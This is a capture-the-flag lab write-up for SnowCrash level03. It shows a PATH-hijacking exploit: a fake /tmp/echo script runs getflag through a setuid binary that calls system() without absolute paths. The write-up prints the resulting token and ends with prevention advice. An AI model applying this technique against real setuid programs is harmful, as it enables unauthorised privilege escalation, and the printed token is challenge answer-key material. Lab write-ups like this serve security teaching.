[README.md](../README.md)
# level03

In the home directory of level03, the following files can be found:

```sh
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

```sh
level03@SnowCrash:~$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

When executing the file:
```sh
level03@SnowCrash:~$ ./level03
Exploit me
```

Running `ltrace`:
```sh
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                             = 2003
geteuid()                                                             = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                   = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                   = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                = 0
```

The library calls made by the program include:
- `getegid()`: Gets the effective group ID of the process.
- `geteuid()`: Gets the effective user ID of the process.
- `setresgid(2003, 2003, 2003, ...)`: Sets the real, effective, and saved group IDs of the process.
- `setresuid(2003, 2003, 2003, ...)`: Sets the real, effective, and saved user IDs of the process.
- `system("/usr/bin/env echo Exploit me")`: Executes the shell command `/usr/bin/env echo Exploit me`.

The program executes the echo command without specifying its absolute path. When a command is executed using system() without specifying the full path to the executable, the system searches for the executable in directories listed in the PATH environment variable. This behavior can be exploited if you control the PATH environment variable and can manipulate it to point to a malicious executable.

However, we do not have permissions to edit the directories listed on the path:
```sh
level03@SnowCrash:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$ touch echo /usr/local/sbin
touch: cannot touch `echo': Permission denied
touch: setting times of `/usr/local/sbin': Permission denied
level03@SnowCrash:~$ touch echo /usr/local/bin
touch: cannot touch `echo': Permission denied
touch: setting times of `/usr/local/bin': Permission denied
level03@SnowCrash:~$ touch echo /usr/sbin
touch: cannot touch `echo': Permission denied
touch: setting times of `/usr/sbin': Permission denied
level03@SnowCrash:~$ touch echo /usr/bin
touch: cannot touch `echo': Permission denied
touch: setting times of `/usr/bin': Permission denied
level03@SnowCrash:~$ touch echo /usr/sbin
touch: cannot touch `echo': Permission denied
touch: setting times of `/usr/sbin': Permission denied
level03@SnowCrash:~$ touch echo /sbin
touch: cannot touch `echo': Permission denied
touch: setting times of `/sbin': Permission denied
level03@SnowCrash:~$ touch echo /bin
touch: cannot touch `echo': Permission denied
touch: setting times of `/bin': Permission denied
level03@SnowCrash:~$ touch echo /usr/games
touch: cannot touch `echo': Permission denied
touch: setting times of `/usr/games': Permission denied
```

So, we create an echo executable in the /tmp directory and add it to the PATH:

```sh
level03@SnowCrash:~$ vim /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH="/tmp:$PATH"
```

```bash
#!/bin/bash
/bin/getflag
```

Now, when executing level03, we get:
```sh
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Prevention
To avoid this vulnerability, it's essential to follow secure coding practices:
- When executing shell commands from within a program, always specify the full path to the executable rather than relying on the system's default search path.
- Avoid using functions like `system()` that execute shell commands with user-controlled input whenever possible, as they can introduce security risks.
- Instead, consider using safer alternatives like `execve()` or library functions provided by programming languages that allow you to execute commands securely with controlled arguments. Furthermore, ensure that sensitive operations, such as setting file permissions or executing commands with elevated privileges, are properly validated and restricted to authorized users or processes.